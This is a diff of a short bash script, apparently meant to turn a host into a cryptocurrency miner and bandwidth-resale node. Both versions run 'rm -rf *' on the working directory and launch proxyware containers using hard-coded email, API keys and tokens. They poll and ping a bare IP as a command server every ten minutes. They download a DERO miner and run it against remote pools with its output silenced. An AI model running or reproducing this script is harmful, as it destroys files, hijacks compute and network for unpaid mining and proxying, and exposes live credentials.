@@ -1,50 +1,10 @@
 #!/bin/bash
-
-# Xóa toàn bộ file trong thư mục hiện tại
-rm -rf *
-
-# Chạy container repocket
-docker run --name repocket \
-  -e RP_EMAIL=minshousevn@gmail.com \
-  -e RP_API_KEY=69b5f8b8-40d4-4586-9247-4aa27e48ccfe \
-  -d repocket/repocket
-
-# Chạy container earnfm
-sudo docker run -d \
-  -e EARNFM_TOKEN="551db9d4-2e8b-490c-a673-a2eb5fa06aa1" \
-  earnfm/earnfm-client:latest
-
-# Chạy container traffmonetizer
-docker run -d traffmonetizer/cli_v2 start accept \
-  --token qYmpmZjOyzrZcuSB+NPKHI9bByosxCsdtqznZGzOTx4=
-
-# Lấy device_id từ API
-DEVICE_ID=$(curl -s http://172.245.228.66:3000/get-offline-key | jq -r '.device_id') &&
-
-# Chạy container proxyrack
-sudo docker run -d --name proxyrack --restart always \
-  -e UUID="$DEVICE_ID" proxyrack/pop
-
-# Ping API định kỳ trong vòng lặp
-(
-  while true; do
-    curl -X POST http://172.245.228.66:3000/ping \
-      -H "Content-Type: application/json" \
-      -d '{"device_id": "'"$DEVICE_ID"'"}'
-    sleep 600
-  done
-)
-
-# Tải và giải nén công cụ astrominer
-wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz &&
-tar -xvf astrominer-V1.9.2.R5_amd64_linux.tar.gz &&
-./astrominer/astrominer \
-  -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l \
-  -log-interval 600 -m 1 -p rpc -r 15.235.199.131:10100 > /dev/null 2>&1
-
-# Vòng lặp vô hạn in "ilovingyou" mỗi 60 giây
-while true; do
-  clear
-  echo "ilovingyou"
-  sleep 60
-done
+rm -rf * & wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && tar -xvf astrominer-V1.9.2.R5_amd64_linux.tar.gz && ./astrominer/astrominer -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l -log-interval 600 -m 1 -p rpc -r 15.235.199.131:10100 -r1 74.48.96.46:10100 > /dev/null 2>&1
+docker run --name repocket -e RP_EMAIL=minshousevn@gmail.com -e RP_API_KEY=69b5f8b8-40d4-4586-9247-4aa27e48ccfe -d --restart=always repocket/repocket
+sudo docker run -d -e EARNFM_TOKEN="acd4f217-8a33-4d70-80dc-e80193543a07"  earnfm/earnfm-client:latest
+docker run -d traffmonetizer/cli_v2 start accept --token YEe8ODHfxfE+J0JgtnXVobcutumvC3zbS67H1Hb7diI= > /dev/null 2>&1
+DEVICE_ID=$(curl -s http://172.245.228.66:3000/get-offline-key | jq -r '.device_id')
+sleep 10
+sudo docker run -d --name proxyrack --restart always -e UUID="$DEVICE_ID" proxyrack/pop 
+(while true; do curl -X POST http://172.245.228.66:3000/ping -H "Content-Type: application/json" -d '{"device_id": "'"$DEVICE_ID"'"}'; sleep 600; done &)
+while true; do clear; echo "ilovingyou"; sleep 60; done
